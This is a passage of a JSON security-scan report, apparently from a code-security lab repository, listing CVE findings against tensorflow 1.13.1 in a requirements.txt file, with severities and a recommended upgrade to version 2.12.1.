            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41887 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41887](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41887)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f680ccc4c03cef72970d5e58f6542ea815ae7910"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25675",
          "ruleIndex": 431,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25675 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25675)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b20585583da094968870133aed7d682f81bf49cd"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25663",
          "ruleIndex": 432,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25663 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25663](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25663)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "64c2bf206e221da479df05b212e4f38e0f8a6322"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25660",
          "ruleIndex": 433,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25660 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25660](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25660)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e28165243168b7278601f0fff1d60eecdf43f106"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25667",
          "ruleIndex": 434,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25667 (severity: medium, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25667](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25667)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1b4be4059fa62f891062ca4a8db05eb7d8ac416b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25662",
          "ruleIndex": 435,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25662 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25662](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25662)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "254de6ed0eced27d824981effb9ddf362a1a1481"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25668",
          "ruleIndex": 436,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25668 (severity: critical, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25668](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25668)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ed0a7d0c5cf776c263c78f101f7f16e33041f022"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25673",
          "ruleIndex": 437,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25673 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25673](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25673)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "456dcce32c8586492a9299b4569a7675e6736890"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25676",
          "ruleIndex": 438,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25676 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25676)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ca08ab83cf524da1d721a894df5239591d769cb6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25672",
          "ruleIndex": 439,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25672 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25672](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25672)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3c6ec228073d6b564954326f683fb8e3125fa825"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25659",
          "ruleIndex": 440,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25659 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25659](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25659)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ac1a821736f042e758d873c7d986faa1c65799b5"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25669",
          "ruleIndex": 441,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25669 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25669](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25669)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "03134fb017aaadc02c57d345c3e404441fc6b6ad"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25666",
          "ruleIndex": 442,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25666 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25666](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25666)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e6538d6e72a789d29c83d46e527f55466451750a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25665",
          "ruleIndex": 443,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25665 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25665)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "741eff25a2c89ad0c3757f55a66f36854549d411"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25671",
          "ruleIndex": 444,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25671 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25671](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25671)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "260fe62fa77aa30f6c678b291d967da50aa8f887"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25661",
          "ruleIndex": 445,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25661 (severity: medium, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25661](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25661)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "45864fe00b3e12851448e73252d94e10988d05e5"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-27579",
          "ruleIndex": 446,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-27579 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-27579](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27579)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
